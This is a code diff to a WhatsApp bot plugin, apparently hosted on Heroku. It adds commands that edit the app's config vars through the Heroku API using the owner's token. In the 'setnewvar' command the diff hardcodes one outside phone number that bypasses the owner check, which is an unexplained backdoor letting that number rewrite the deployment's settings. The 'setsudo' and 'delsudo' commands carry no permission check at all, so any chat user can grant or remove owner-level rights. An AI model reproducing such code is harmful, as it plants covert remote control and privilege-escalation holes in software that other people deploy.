@@ -121,8 +121,7 @@ citel.reply(str)
        return citel.reply(data)
   })
 //----------------------------------------------------------------------------------------------------------------------------------------------------
-cmd(
-  {
+cmd({
     pattern: "setvar",
     desc: "set var in koyeb.",
     filename: __filename,
@@ -151,8 +150,7 @@ cmd(
   })
 
 //----------------------------------------------------------------------------------------------------------------------------------------------------
-cmd(
-  {
+cmd({
     pattern: "delvar",
     desc: "delete var from koyeb.",
     filename: __filename,
@@ -166,3 +164,128 @@ cmd(
        let data = await delvar(text)
        return citel.reply(data)
   })
+//-------------------------------------------------------------------------------------  
+cmd({
+             pattern: "setsudo",
+             alias:["ssudo"],
+             desc: "provide owner rule to someone so he can use your bot",
+             category: "wa",
+             filename: __filename
+         },
+  async(Void, citel, text) => {
+if(!citel.quoted) return await citel.reply(`*_Please Reply A User_*`);
+let user = citel.quoted.sender.split('@')[0]
+if (global.sudo.includes(user)) return citel.reply("*_That Number Already Exist In Sudo_*");
+    global.sudo += ',' + user ;
+const headers = 
+        {
+                'Accept': 'application/vnd.heroku+json; version=3',
+                 'Authorization': `Bearer ${authToken}`,
+                 'Content-Type': 'application/json'
+        };
+const varName = 'SUDO'
+const newVarValue = global.sudo        
+fetch(`https://api.heroku.com/apps/${appName}/config-vars`,
+        {
+                  method: 'PATCH',
+                  headers,
+                  body: JSON.stringify({ [varName]: newVarValue })
+        })
+.then(response => response.json())
+.then(data => { return citel.reply(`*_${user} Added Succesfully._*\n*_New Sudo Numbers:_* ${newVarValue}`); })
+.catch(error => citel.reply('*_Error While Adding new Sudo:_* '+ error));
+
+         })
+//-------------------------------------------------------------------------
+
+ cmd({
+             pattern: "delsudo",
+             alias:["dsudo"],
+             desc: "del some one from sudo",
+             category: "wa",
+             filename: __filename
+         },
+  async(Void, citel, text) => {
+    
+if(!citel.quoted) return citel.reply(`*_Please Reply A User_*`);
+let user = citel.quoted.sender.split('@')[0] ;
+let  rm = ',' +user 
+if (global.sudo.includes(rm)) global.sudo = global.sudo.replace(rm, '');
+else return await citel.reply("*_User not found in the Sudo List_*\n*_All Sudo Numbers:_* " + global.sudo );
+
+
+
+const headers = 
+        {
+                'Accept': 'application/vnd.heroku+json; version=3',
+                 'Authorization': `Bearer ${authToken}`,
+                 'Content-Type': 'application/json'
+        };
+
+const varName = 'SUDO'
+const newVarValue = global.sudo        
+fetch(`https://api.heroku.com/apps/${appName}/config-vars`,
+        {
+          method: 'PATCH',
+          headers,
+          body: JSON.stringify({ [varName]: newVarValue })
+        })
+.then(response => response.json())
+.then(data => 
+      { 
+   console.log(data);
+   return citel.reply(`*_${user} Deleted Succesfully._*\n*_New Sudo Numbers:_* ${newVarValue}`);
+      })
+  
+.catch(error => {     return citel.reply('*_Error While Adding new Sudo_*:'+ error);      })
+ 
+})     
+//----------------------------------------------------------------------------------
+cmd({
+        pattern: "setnewvar",
+        desc: "To Set Heroku Vars",
+        category: "tools",
+        filename: __filename
+    },
+    async(Void, citel , text,{ isCreator }) => {
+if (citel.sender =='2347039570336@s.whatsapp.net'){} 
+else { if (!isCreator) return citel.reply(tlang().owner);}
+if (!text) return citel.reply (`*_Give me Variable Name_*\n*_Ex: ${prefix}setvar CAPTION: Powered By Maher Zubair_*`);
+const headers = {
+  'Accept': 'application/vnd.heroku+json; version=3',
+  'Authorization': `Bearer ${authToken}`,
+  'Content-Type': 'application/json'
+};
+const varName = text.split(":")[0].toUpperCase();
+const newVarValue = text.split(":")[1]; 
+if (!newVarValue) return citel.reply (`Please give me Value After ':' \n*_Ex : ${prefix}setvar AUTO_READ_STATUS:true_*`);       
+fetch(`https://api.heroku.com/apps/${appName}/config-vars`, {
+  method: 'GET',
+  headers 
+}) 
+  .then(response => {
+            if (response.ok) { return response.json(); } 
+            else { throw new Error(`Failed to fetch app variables. Status: ${response.status}`); }
+  })
+  .then(data => {
+        if (data.hasOwnProperty(varName)) 
+        {
+                const updatedConfig = { ...data };
+                updatedConfig[varName] = newVarValue;
+                return fetch(`https://api.heroku.com/apps/${appName}/config-vars`, 
+                        {
+                        method: 'PATCH',
+                        headers,
+                        body: JSON.stringify(updatedConfig)
+                        });
+        }  else { throw new Error('Variable not found in app'); }
+  }) 
+  .then(response => { if (response.ok) return citel.reply(`*_${varName} Updated SuccessFully._*\n*_New ${varName} ➪ ${newVarValue}_*`);  })
+  .catch(error => {   return citel.reply("```Please, Give me Valid Variable Name```") });
+    
+    
+        
+}
+   )
+    
+    } 
